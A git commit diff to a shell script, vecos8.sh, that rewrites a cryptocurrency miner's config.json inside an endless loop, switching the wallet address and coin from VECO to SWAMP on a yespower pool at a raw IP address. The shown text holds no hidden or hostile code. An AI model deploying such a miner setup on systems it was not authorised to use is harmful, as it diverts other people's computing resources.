5be049a844afe4163579a0feb6b6d873b959d593
barburonjilo <barburonjilo@outlook.co.id>
2025-05-09 19:36:04 +0700

    Update vecos8.sh

--- vecos8.sh
+++ vecos8.sh
@@ -12,8 +12,8 @@ while true; do
   cat > config.json <<END
 {
   "url": "45.115.224.111:443",
-  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker8",
-  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
+  "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ.worker8",
+  "pass": "c=SWAMP,m=solo,zap=SWAMP,mc=SWAMP",
   "threads": 6,
   "algo": "yespower"
 }
